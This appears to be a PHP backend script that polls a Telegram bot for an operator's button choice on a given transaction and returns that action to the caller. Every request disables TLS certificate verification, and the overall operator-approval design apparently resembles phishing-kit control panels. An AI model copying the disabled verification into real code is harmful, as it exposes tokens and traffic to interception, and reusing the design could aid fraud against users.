<?php
session_start();
header('Content-Type: application/json');
ini_set('display_errors', 0);
error_reporting(E_ALL & ~E_NOTICE & ~E_WARNING);

try {
    $config = require __DIR__ . '/../config.php';

    $transactionId = $_POST['transactionId'] ?? '';
    $messageId = $_POST['messageId'] ?? '';

    if (empty($transactionId) || empty($messageId)) {
        echo json_encode(['action' => null]);
        exit;
    }

    // Desactivar webhook si estuviera activo
    $wh = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getWebhookInfo");
    curl_setopt_array($wh, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $whRes = curl_exec($wh);
    curl_close($wh);
    $whInfo = json_decode($whRes, true);

    if (!empty($whInfo['result']['url'])) {
        $dw = curl_init("https://api.telegram.org/bot{$config['bot_token']}/deleteWebhook");
        curl_setopt_array($dw, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($dw);
        curl_close($dw);
    }

    // Obtener actualizaciones
    $offset = $_SESSION['last_update_id'] ?? 0;
    $ch = curl_init("https://api.telegram.org/bot{$config['bot_token']}/getUpdates?offset=" . ($offset + 1));
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false
    ]);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);
    if (!$data || !isset($data['result']) || !is_array($data['result'])) {
        echo json_encode(['action' => null]);
        exit;
    }

    foreach ($data['result'] as $update) {
        if (!isset($update['callback_query'])) continue;

        $callback = $update['callback_query'];
        if (strpos($callback['data'], $transactionId) === false) continue;

        list($action, ) = explode(':', $callback['data']);
        $operator = $callback['from']['first_name'] ?? 'Operador';

        $_SESSION['last_update_id'] = $update['update_id'];

        $originalText = $callback['message']['text'] ?? '';
        $nuevoTexto = $originalText . "\n\n✅ Acción tomada: <b>" . strtoupper($action) . "</b>\n👤 Operador: $operator";

        $removeButtons = [
            'chat_id' => $config['chat_id'],
            'message_id' => $messageId,
            'reply_markup' => json_encode(['inline_keyboard' => []])
        ];
        $ch1 = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageReplyMarkup");
        curl_setopt_array($ch1, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($removeButtons),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($ch1);
        curl_close($ch1);

        $editText = [
            'chat_id' => $config['chat_id'],
            'message_id' => $messageId,
            'text' => $nuevoTexto,
            'parse_mode' => 'HTML'
        ];
        $ch2 = curl_init("https://api.telegram.org/bot{$config['bot_token']}/editMessageText");
        curl_setopt_array($ch2, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => json_encode($editText),
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false
        ]);
        curl_exec($ch2);
        curl_close($ch2);

        echo json_encode(['action' => $action]);
        exit;
    }

    echo json_encode(['action' => null]);
} catch (Throwable $e) {
    echo json_encode(['action' => null, 'error' => $e->getMessage()]);
}